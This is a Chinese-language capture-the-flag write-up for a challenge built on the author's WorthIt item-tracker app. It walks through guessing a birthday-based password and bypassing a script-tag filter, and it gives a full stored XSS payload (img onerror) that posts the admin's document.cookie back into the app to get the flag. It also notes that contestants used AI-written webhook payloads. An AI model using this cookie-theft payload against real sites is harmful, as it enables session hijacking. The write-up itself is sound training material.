# Writeup

## 获取账号密码

根据「一加 ACE 5」的描述 `这是 Luminoria 买给自己的 18 岁生日礼物，超好用哒~`，可以合理猜测，密码可能跟生日有关，观察到购买日期为 `2024-11-05`，十八岁的话，实际上 `Luminoria` 的出生日期可能是 `2006-11-05`（然而实际并不是，本题是），猜测密码为 `20061105`

> 注：实际上，11.5 是丝柯克的生日捏

所以得到了以下的凭据

- Username: Luminoria
- Password: 20061105

尝试登录，发现正确

![](https://cdn.jsdelivr.net/gh/GDUTMeow-Challenges/Challenge-WorthIt/img/chrome_qRVvyiurc2.png)

## XSS 尝试

因为这里很明显有存储功能，可以尝试一下是否存在存储型 XSS，尝试添加一个名字为 `<script>alert(1)</script>` 的物品，发现添加失败，在 Dev Tool 能看到不允许用 `<script>` 标签

![](https://cdn.jsdelivr.net/gh/GDUTMeow-Challenges/Challenge-WorthIt/img/chrome_0ANg6tlHYx.png)

尝试用 `<img>` 的 `onerror`，发现是可以成功添加的，并且可以正确触发

![](https://cdn.jsdelivr.net/gh/GDUTMeow-Challenges/Challenge-WorthIt/img/chrome_LSSUaUbA4p.png)

## Payload

所以直接用 `onerror`，让 Luminoria 把 Cookie 弹出来，所以有 payload 如下

`<img src="x" onerror="fetch('/api/admin/items', {method: 'POST', headers: {'Content-Type': 'application/json'}, credentials: 'include', body: JSON.stringify({'properties': {'name': document.cookie, 'purchase_price': '114514', 'entry_date': '2025-06-19'}})});">`

需要注意的是，如果不填写物品的名称和购买时间的话，后端校验会不通过

**如果不是在网页的输入框里，而是在 Yakit 等工具里面，记得用反斜杠 `\` 转义双引号（如图）**

![](https://cdn.jsdelivr.net/gh/GDUTMeow-Challenges/Challenge-WorthIt/img/Yakit_91EfigMSps.png)

添加后，会发现出现了一个奇怪的卡片

![](https://cdn.jsdelivr.net/gh/GDUTMeow-Challenges/Challenge-WorthIt/img/chrome_Rsyb95sXTl.png)

点击左侧的「呼叫」按钮，让 Luminoria 来看网站，就可以拿到 flag 了

![](https://cdn.jsdelivr.net/gh/GDUTMeow-Challenges/Challenge-WorthIt/img/chrome_rJUGJtUZgF.png)

我这里是本地测的，所以 flag 也是我自己填的 `FLAG=Nyan{thE_poW3r-0f-Xs5-1S-inf1n1TY}`

## 彩蛋：出题契机

其实这个网站是我写的一个小玩具，但是写的时候没有注意到 XSS 的问题，卡片是直接用 innerHTML 进行渲染的

> WorthIt 记物：https://github.com/GamerNoTitle/WorthIt

结果后面 Rusty 测试的时候，就帮我测出了这个问题，然后转念一想，这不是刚好可以拿来出题嘛

然后这题就是这么出来了，用我那个源码花了三个半钟来构建和测试题目

![](https://cdn.jsdelivr.net/gh/GDUTMeow-Challenges/Challenge-WorthIt/img/1isCBlybS7.png)

### 补充说明

因为容器是不出网的，很多选手应该是让 AI 写的 payload 使用了 webhook，但因为容器不出网所以是运行不了的。